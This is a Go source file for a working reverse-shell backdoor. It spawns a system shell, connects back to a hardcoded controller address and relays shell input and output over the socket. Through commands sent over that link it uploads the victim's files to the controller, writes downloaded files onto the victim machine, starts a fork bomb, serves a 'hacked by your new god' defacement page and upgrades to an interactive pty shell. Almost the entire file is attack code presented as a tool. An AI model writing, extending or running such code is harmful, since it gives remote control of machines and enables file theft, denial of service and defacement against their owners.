package main

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

const goos = runtime.GOOS

func boom() {
	for {
		go boom()
	}
}

func webclient(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("<title>I'm your new god</title>\n<body bgcolor=\"FF0000\"><h1 style=\"color:white;\">This website has been hacked by your new god</h1>\n<img width=\"600\" height=\"400\" src=\"https://i.pinimg.com/originals/33/e6/5b/33e65bee329028d573a61bd4e0860cac.jpg\"></img></body>"))
}

func main() {
	var cmd *exec.Cmd
	if goos == "windows" {
		cmd = exec.Command("cmd.exe")
	} else if goos == "linux" {
		cmd = exec.Command("/bin/sh", "-i")
	}

	data1 := make([]byte, 10000)
	ip := "127.0.0.1"
	opipe, _ := cmd.StdoutPipe()
	ipipe, _ := cmd.StdinPipe()

	for {
		var con net.Conn
		var err error

		cmd.Start()

		fl := true
		for err != nil || fl {
			fl = false
			con, err = net.Dial("tcp", fmt.Sprintf("%s:1234", ip))
		}
		go io.Copy(con, opipe)
		for {
			size, err2 := con.Read(data1)
			if err2 != nil || size <= 0 {
				con.Close()
				break
			}
			datap := data1[:size]
			if string(datap) == "ping\n" {
				con.Write([]byte("pong"))
			} else if string(datap) == "boom\n" {
				con.Write([]byte("Kabooom!"))
				go boom()
			} else if string(datap[:3]) == "put" {
				//time.Sleep(10 * time.Millisecond)
				con2, _ := net.Dial("tcp", fmt.Sprintf("%s:1235", ip))
				name2 := strings.Split(string(datap[4:]), "/")
				file2, _ := os.Create(name2[len(name2)-1:][0])
				io.Copy(file2, con2)
				con2.Close()
				file2.Close()
				continue
			} else if string(datap[:3]) == "get" {
				//time.Sleep(10 * time.Millisecond)
				con2, _ := net.Dial("tcp", fmt.Sprintf("%s:1235", ip))
				name := datap[4:]
				//fmt.Println(string(name))
				file, err := os.Open(string(name))
				if err != nil {
					fmt.Println("Error!")
				}
				io.Copy(con2, file)
				//time.Sleep(1 * time.Millisecond)
				con2.Close()
				file.Close()
				continue
			} else if string(datap) == "deface\n" {
				http.HandleFunc("/", webclient)
				go http.ListenAndServe(":8080", nil)
				con.Write([]byte("Defaced ;)"))
			} else if string(datap) == "close\n" {
				con.Write([]byte("Bye!"))
				os.Exit(0)
			} else if string(datap) == "shell\n" {
				ipipe.Write([]byte("python -c 'import pty; pty.spawn(\"/bin/sh\")'\n"))
			} else {
				ipipe.Write(datap)
			}
		}
	}
}
